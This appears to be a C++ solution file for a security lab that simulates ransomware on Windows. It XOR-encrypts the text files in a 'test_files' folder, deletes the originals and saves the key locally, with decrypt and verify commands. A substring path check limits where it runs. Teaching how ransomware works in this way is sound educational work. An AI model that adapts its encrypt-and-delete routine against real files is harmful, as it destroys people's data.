// sol03_ransomware_sim.cpp — Safe Ransomware Simulation (XOR encryption)
// ONLY processes files inside a 'test_files' subdirectory.
// Hard safety check: refuses to run on any path that doesn't contain "test_files".
//
// Compile:
//   g++ -std=c++17 -Wall -o sol03.exe solutions/sol03_ransomware_sim.cpp -ladvapi32
//
// Usage:
//   sol03.exe setup                          -- create test_files/ with samples
//   sol03.exe encrypt <test_files_dir>       -- XOR-encrypt all .txt -> .enc
//   sol03.exe decrypt <test_files_dir> <key> -- XOR-decrypt all .enc -> .txt
//   sol03.exe verify                         -- check restored files match originals

#include <windows.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>

// ---------------------------------------------------------------------------
// Safety check: target path MUST contain "test_files"
// ---------------------------------------------------------------------------
static bool is_safe_path(const std::string& path)
{
    std::string lower = path;
    for (char& c : lower) c = (char)tolower(c);
    return lower.find("test_files") != std::string::npos;
}

// ---------------------------------------------------------------------------
// Key management: 32-byte random key stored as hex in ransom_key.bin
// ---------------------------------------------------------------------------
static const int KEY_LEN = 32;

static bool generate_key(uint8_t key[KEY_LEN])
{
    // Use CryptGenRandom via BCryptGenRandom substitute (CryptAcquireContext)
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return false;
    bool ok = CryptGenRandom(hProv, KEY_LEN, key) == TRUE;
    CryptReleaseContext(hProv, 0);
    return ok;
}

static bool save_key(const char* key_file, const uint8_t key[KEY_LEN])
{
    FILE* f = fopen(key_file, "wb");
    if (!f) return false;
    // Save as raw bytes + hex text for easy inspection
    fwrite(key, 1, KEY_LEN, f);
    fclose(f);
    printf("[key] Saved to %s (%d bytes raw)\n", key_file, KEY_LEN);
    printf("[key] Hex: ");
    for (int i = 0; i < KEY_LEN; i++) printf("%02X", key[i]);
    printf("\n");
    return true;
}

static bool load_key(const char* key_file, uint8_t key[KEY_LEN])
{
    FILE* f = fopen(key_file, "rb");
    if (!f) { fprintf(stderr, "Cannot open key file: %s\n", key_file); return false; }
    size_t n = fread(key, 1, KEY_LEN, f);
    fclose(f);
    if (n != KEY_LEN) { fprintf(stderr, "Key file too short (%zu bytes, need %d)\n", n, KEY_LEN); return false; }
    return true;
}

// ---------------------------------------------------------------------------
// XOR encrypt/decrypt (symmetric — same operation)
// ---------------------------------------------------------------------------
static std::vector<uint8_t> xor_crypt(const std::vector<uint8_t>& data, const uint8_t key[KEY_LEN])
{
    std::vector<uint8_t> out(data.size());
    for (size_t i = 0; i < data.size(); i++)
        out[i] = data[i] ^ key[i % KEY_LEN];
    return out;
}

// ---------------------------------------------------------------------------
// File helpers
// ---------------------------------------------------------------------------
static std::vector<uint8_t> read_file(const std::string& path)
{
    std::ifstream f(path, std::ios::binary);
    return std::vector<uint8_t>((std::istreambuf_iterator<char>(f)),
                                 std::istreambuf_iterator<char>());
}

static bool write_file(const std::string& path, const std::vector<uint8_t>& data)
{
    std::ofstream f(path, std::ios::binary);
    if (!f) return false;
    f.write((const char*)data.data(), data.size());
    return f.good();
}

// Enumerate files with given extension in a directory (non-recursive)
static std::vector<std::string> list_files(const std::string& dir, const std::string& ext)
{
    std::vector<std::string> out;
    std::string pattern = dir + "\\*" + ext;
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return out;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            out.push_back(dir + "\\" + fd.cFileName);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return out;
}

// ---------------------------------------------------------------------------
// Sample file contents for setup
// ---------------------------------------------------------------------------
static const struct { const char* name; const char* content; } SAMPLES[] = {
    { "document1.txt",
      "Project Alpha - Status Report\n"
      "Date: 2024-01-15\n"
      "Status: In Progress\n"
      "Owner: Alice Smith\n"
      "Notes: Phase 1 complete, Phase 2 starts next week.\n" },
    { "credentials.txt",
      "Server: 192.168.1.50\n"
      "Username: admin\n"
      "Password: Sup3rS3cr3t!\n"
      "Database: prod_db\n" },
    { "financial_q4.txt",
      "Q4 Revenue: $1,250,000\n"
      "Q4 Expenses: $890,000\n"
      "Q4 Net: $360,000\n"
      "Target Q1: $1,400,000\n" },
    { "personal_notes.txt",
      "Vacation booked: Mar 5-12\n"
      "Doctor appt: Feb 20 @ 2pm\n"
      "Birthday: Call Mom on Feb 3\n" },
    { "config.txt",
      "api_key=sk-abc123xyz789\n"
      "endpoint=https://api.example.com/v2\n"
      "retries=3\n"
      "timeout=30\n" },
};

// ---------------------------------------------------------------------------
// Commands
// ---------------------------------------------------------------------------
static void cmd_setup()
{
    char cwd[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, cwd);
    std::string dir = std::string(cwd) + "\\test_files";

    CreateDirectoryA(dir.c_str(), NULL);
    printf("Creating test environment in: %s\n\n", dir.c_str());

    for (int i = 0; i < 5; i++) {
        std::string path = dir + "\\" + SAMPLES[i].name;
        FILE* f = fopen(path.c_str(), "w");
        if (!f) { fprintf(stderr, "Failed to create %s\n", SAMPLES[i].name); continue; }
        fputs(SAMPLES[i].content, f);
        fclose(f);
        printf("  Created: %s\n", SAMPLES[i].name);
    }

    // Save a manifest of original file hashes for verify
    std::string manifest_path = dir + "\\manifest.txt";
    FILE* mf = fopen(manifest_path.c_str(), "w");
    if (mf) {
        for (int i = 0; i < 5; i++) {
            // Simple checksum: sum of bytes
            uint32_t sum = 0;
            for (const char* p = SAMPLES[i].content; *p; p++) sum += (uint8_t)*p;
            fprintf(mf, "%s|%u|%zu\n", SAMPLES[i].name, sum,
                    strlen(SAMPLES[i].content));
        }
        fclose(mf);
        printf("  Created: manifest.txt\n");
    }
    printf("\nSetup complete. Run 'encrypt test_files' to simulate attack.\n");
}

static void cmd_encrypt(const char* dir_path)
{
    if (!is_safe_path(dir_path)) {
        fprintf(stderr, "[SAFETY] Refusing to encrypt path that doesn't contain 'test_files'.\n");
        fprintf(stderr, "         Path: %s\n", dir_path);
        return;
    }

    // Ensure directory exists
    DWORD attr = GetFileAttributesA(dir_path);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        fprintf(stderr, "Directory not found: %s\n", dir_path);
        fprintf(stderr, "Run 'setup' first.\n");
        return;
    }

    // Generate key
    uint8_t key[KEY_LEN];
    if (!generate_key(key)) { fprintf(stderr, "Key generation failed\n"); return; }

    // Determine key file path (one level up from test_files or current dir)
    char cwd[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, cwd);
    std::string key_file = std::string(cwd) + "\\ransom_key.bin";
    if (!save_key(key_file.c_str(), key)) { fprintf(stderr, "Cannot save key\n"); return; }

    auto txt_files = list_files(dir_path, ".txt");
    // Skip manifest
    std::vector<std::string> targets;
    for (auto& f : txt_files)
        if (f.find("manifest.txt") == std::string::npos)
            targets.push_back(f);

    printf("\nEncrypting %zu files in %s...\n\n", targets.size(), dir_path);

    int ok = 0;
    for (const auto& src : targets) {
        auto data = read_file(src);
        if (data.empty()) { printf("  SKIP (empty): %s\n", src.c_str()); continue; }

        auto enc = xor_crypt(data, key);
        std::string dst = src.substr(0, src.size() - 4) + ".enc";

        if (!write_file(dst, enc)) { fprintf(stderr, "  FAIL write: %s\n", dst.c_str()); continue; }
        DeleteFileA(src.c_str());
        printf("  Encrypted: %s -> %s (%zu bytes)\n",
               src.substr(src.rfind('\\')+1).c_str(),
               dst.substr(dst.rfind('\\')+1).c_str(),
               enc.size());
        ok++;
    }

    printf("\n%d/%zu files encrypted.\n", ok, targets.size());
    printf("Key saved to: %s\n", key_file.c_str());
    printf("\nTo restore: sol03.exe decrypt \"%s\" \"%s\"\n", dir_path, key_file.c_str());
}

static void cmd_decrypt(const char* dir_path, const char* key_file)
{
    if (!is_safe_path(dir_path)) {
        fprintf(stderr, "[SAFETY] Refusing to decrypt path that doesn't contain 'test_files'.\n");
        return;
    }

    uint8_t key[KEY_LEN];
    if (!load_key(key_file, key)) return;

    auto enc_files = list_files(dir_path, ".enc");
    printf("Decrypting %zu files in %s...\n\n", enc_files.size(), dir_path);

    int ok = 0;
    for (const auto& src : enc_files) {
        auto data = read_file(src);
        if (data.empty()) { printf("  SKIP (empty): %s\n", src.c_str()); continue; }

        auto dec = xor_crypt(data, key);
        // Remove .enc, restore .txt
        std::string dst = src.substr(0, src.size() - 4) + ".txt";

        if (!write_file(dst, dec)) { fprintf(stderr, "  FAIL write: %s\n", dst.c_str()); continue; }
        DeleteFileA(src.c_str());
        printf("  Decrypted: %s -> %s (%zu bytes)\n",
               src.substr(src.rfind('\\')+1).c_str(),
               dst.substr(dst.rfind('\\')+1).c_str(),
               dec.size());
        ok++;
    }
    printf("\n%d/%zu files decrypted.\n", ok, enc_files.size());
}

static void cmd_verify()
{
    char cwd[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, cwd);
    std::string dir = std::string(cwd) + "\\test_files";
    std::string manifest_path = dir + "\\manifest.txt";

    FILE* mf = fopen(manifest_path.c_str(), "r");
    if (!mf) { fprintf(stderr, "manifest.txt not found in test_files. Run 'setup' first.\n"); return; }

    printf("Verifying restored files...\n\n");
    int pass=0, fail=0;
    char line[512];
    while (fgets(line, sizeof(line), mf)) {
        char fname[256]; uint32_t expected_sum; size_t expected_len;
        if (sscanf_s(line, "%255[^|]|%u|%zu", fname, (unsigned)sizeof(fname),
                     &expected_sum, &expected_len) != 3) continue;

        std::string fpath = dir + "\\" + fname;
        auto data = read_file(fpath);
        if (data.empty() && expected_len > 0) {
            printf("  FAIL %s — file missing or empty\n", fname);
            fail++; continue;
        }
        uint32_t actual_sum = 0;
        for (uint8_t b : data) actual_sum += b;
        if (actual_sum == expected_sum && data.size() == expected_len) {
            printf("  PASS %s (%zu bytes, checksum %u)\n", fname, data.size(), actual_sum);
            pass++;
        } else {
            printf("  FAIL %s — expected sum=%u len=%zu, got sum=%u len=%zu\n",
                   fname, expected_sum, expected_len, actual_sum, data.size());
            fail++;
        }
    }
    fclose(mf);
    printf("\nResult: %d passed, %d failed\n", pass, fail);
}

// ---------------------------------------------------------------------------
int main(int argc, char* argv[])
{
    printf("=== Ransomware Simulation Lab ===\n");
    printf("SAFETY: Only operates on paths containing 'test_files'\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  sol03.exe setup\n");
        printf("  sol03.exe encrypt <test_files_dir>\n");
        printf("  sol03.exe decrypt <test_files_dir> <ransom_key.bin>\n");
        printf("  sol03.exe verify\n");
        return 1;
    }

    const char* cmd = argv[1];
    if (strcmp(cmd, "setup") == 0) {
        cmd_setup();
    } else if (strcmp(cmd, "encrypt") == 0) {
        if (argc < 3) { fprintf(stderr, "encrypt needs <dir>\n"); return 1; }
        cmd_encrypt(argv[2]);
    } else if (strcmp(cmd, "decrypt") == 0) {
        if (argc < 4) { fprintf(stderr, "decrypt needs <dir> <key_file>\n"); return 1; }
        cmd_decrypt(argv[2], argv[3]);
    } else if (strcmp(cmd, "verify") == 0) {
        cmd_verify();
    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        return 1;
    }
    return 0;
}
